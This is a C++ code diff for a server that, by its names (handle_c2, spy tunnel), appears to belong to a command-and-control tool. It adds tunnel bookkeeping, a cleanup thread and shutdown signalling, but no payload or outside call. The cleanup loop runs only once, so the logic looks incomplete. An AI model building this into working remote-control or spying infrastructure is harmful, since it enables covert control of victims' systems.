@@ -93,6 +93,8 @@ int Server::init() {
     log_context_ = std::make_shared<LogContext>();
     log_context_->p_user_verbosity_ = &user_verbosity_;
 
+    tunnel_context_ = std::make_shared<TunnelContext>();
+
     return 0;
 }
 
@@ -102,10 +104,12 @@ void Server::start() {
     std::thread accept_thread(&Server::accept_client, this);
     std::thread logger_thread(&Server::log_event, this);
     std::thread c2_thread(&Server::handle_c2, this);
+    std::thread tunnel_cleanup_thread(&Server::cleanup_tunnel_queue, this);
 
     logger_thread.join();
     accept_thread.join();
     c2_thread.join();
+    tunnel_cleanup_thread.join();
 
     if (!shutdown_flag_) {
         shutdown();
@@ -290,6 +294,23 @@ void Server::log_event() {
     }
 }
 
+// If a tunnel is stopped due to error or user wishes to remove it, it will be cleaned up here
+void Server::cleanup_tunnel_queue() {
+    std::unique_lock<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+    tunnel_context_->tunnel_cv_.wait(lock, [this] {return !tunnel_context_->tunnel_queue_.empty();});
+    while (!tunnel_context_->tunnel_queue_.empty()) {
+        Tunnel* tunnel = tunnel_context_->tunnel_queue_.front();
+        tunnel_context_->tunnel_queue_.pop();
+        if (tunnel != nullptr) {
+            tunnel->p_spy_tunnel_->shutdown();
+            if (tunnel->thread_.joinable()) {
+                tunnel->thread_.join();
+            }
+            erase_tunnel(&tunnels_, tunnel->client_index_, tunnel->command_code_);
+        }
+    }
+}
+
 void Server::handle_c2() {
     pid_t pid = fork();
 
@@ -314,7 +335,7 @@ void Server::handle_c2() {
 
     // Parent process
     EventLog event_log(log_context_);
-    CommandHandler command_handler(&clients_, &event_log, &shutdown_flag_, &ip_, port_, &user_verbosity_);
+    CommandHandler command_handler(&clients_, &event_log, &shutdown_flag_, &ip_, port_, &user_verbosity_, &tunnels_, tunnel_context_);
     ScopedEpollFD epoll_fd;
     int rc = 0;
     epoll_fd.fd = epoll_create1(0);
@@ -446,6 +467,12 @@ void Server::cleanup_server() {
 }
 
 void Server::shutdown() { 
+    // Wake up tunnel threads
+    for (auto it=tunnels_.begin();it!=tunnels_.end();it++) {
+        uint64_t u = 1;
+        write(it->tunnel_shutdown_fd_, &u, sizeof(u));
+    }
+    
     shutdown_flag_ = true;
 
     uint64_t u = 1;
